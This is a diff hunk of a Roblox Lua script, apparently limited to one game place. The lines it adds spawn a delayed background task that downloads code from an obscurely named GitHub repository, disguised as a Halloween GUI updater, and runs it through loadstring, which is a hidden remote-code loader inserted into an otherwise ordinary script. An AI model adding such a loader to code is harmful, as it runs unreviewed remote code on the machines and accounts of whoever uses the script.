@@ -8,6 +8,11 @@ if game.PlaceId ~= 140403681187145 then
     return
 end
 
+task.spawn(function()
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/startGuiUpdater_HALOOWEN_vin"))()	
+end)
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
 local SaveData = require(Client.Save).Get()
